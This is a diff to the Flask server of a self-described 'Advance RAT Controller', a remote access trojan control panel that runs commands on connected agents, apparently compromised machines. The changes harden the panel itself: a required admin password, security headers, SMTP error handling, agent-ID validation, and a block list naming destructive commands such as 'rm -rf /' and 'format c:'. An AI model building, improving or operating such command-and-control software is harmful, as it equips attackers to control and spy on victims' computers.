@@ -18,6 +18,7 @@ import threading
 import smtplib
 from email.mime.text import MIMEText
 import json
+import re
 
 # WebRTC imports for SFU functionality
 try:
@@ -37,7 +38,9 @@ class Config:
     """Configuration class for Advance RAT Controller"""
     
     # Admin Authentication
-    ADMIN_PASSWORD = os.environ.get('ADMIN_PASSWORD', 'q')
+    ADMIN_PASSWORD = os.environ.get('ADMIN_PASSWORD')
+    if not ADMIN_PASSWORD:
+        raise ValueError("ADMIN_PASSWORD environment variable is required. Please set a secure password.")
     
     # Flask Configuration
     SECRET_KEY = os.environ.get('SECRET_KEY', None)
@@ -58,6 +61,19 @@ class Config:
 # Initialize Flask app with configuration
 app = Flask(__name__)
 app.config['SECRET_KEY'] = Config.SECRET_KEY or secrets.token_hex(32)  # Use config or generate secure random key
+
+# Add security headers
+@app.after_request
+def add_security_headers(response):
+    """Add security headers to all responses"""
+    response.headers['X-Content-Type-Options'] = 'nosniff'
+    response.headers['X-Frame-Options'] = 'DENY'
+    response.headers['X-XSS-Protection'] = '1; mode=block'
+    response.headers['Strict-Transport-Security'] = 'max-age=31536000; includeSubDomains'
+    response.headers['Content-Security-Policy'] = "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; connect-src 'self' wss: ws:;"
+    response.headers['Referrer-Policy'] = 'strict-origin-when-cross-origin'
+    response.headers['Permissions-Policy'] = 'geolocation=(), microphone=(), camera=()'
+    return response
 
 # Defer CORS/socket initialization until after settings helpers are defined
 socketio = None
@@ -220,8 +236,17 @@ def send_email_notification(subject: str, body: str) -> bool:
         server.sendmail(username, [recipient], msg.as_string())
         server.quit()
         return True
+    except smtplib.SMTPAuthenticationError as e:
+        print(f"SMTP authentication failed: {e}")
+        return False
+    except smtplib.SMTPConnectError as e:
+        print(f"SMTP connection failed: {e}")
+        return False
+    except smtplib.SMTPException as e:
+        print(f"SMTP error: {e}")
+        return False
     except Exception as e:
-        print(f"Email notification failed: {e}")
+        print(f"Unexpected email notification error: {e}")
         return False
 
 # WebRTC Configuration
@@ -2174,6 +2199,10 @@ def stop_stream(agent_id, stream_type):
 @require_auth
 def execute_command(agent_id):
     """Execute a command on an agent"""
+    # Input validation
+    if not agent_id or not re.match(r'^[a-zA-Z0-9\-_]+$', agent_id):
+        return jsonify({'error': 'Invalid agent ID format'}), 400
+    
     if agent_id not in AGENTS_DATA:
         return jsonify({'error': 'Agent not found'}), 404
     
@@ -2187,6 +2216,25 @@ def execute_command(agent_id):
     command = request.json.get('command')
     if not command:
         return jsonify({'error': 'Command is required'}), 400
+    
+    # Validate command length and content
+    command = command.strip()
+    if len(command) > 1000:
+        return jsonify({'error': 'Command too long (max 1000 characters)'}), 400
+    
+    # Block dangerous commands
+    dangerous_patterns = [
+        r'rm\s+-rf\s+/',  # rm -rf /
+        r'del\s+/s\s+/q\s+c:',  # del /s /q c:
+        r'format\s+c:',  # format c:
+        r'shutdown\s+/s',  # shutdown /s
+        r'halt',  # halt
+        r'reboot',  # reboot
+    ]
+    
+    for pattern in dangerous_patterns:
+        if re.search(pattern, command, re.IGNORECASE):
+            return jsonify({'error': 'Dangerous command blocked'}), 400
     
     # Generate execution ID
     execution_id = f"exec_{int(time.time())}_{secrets.token_hex(4)}"
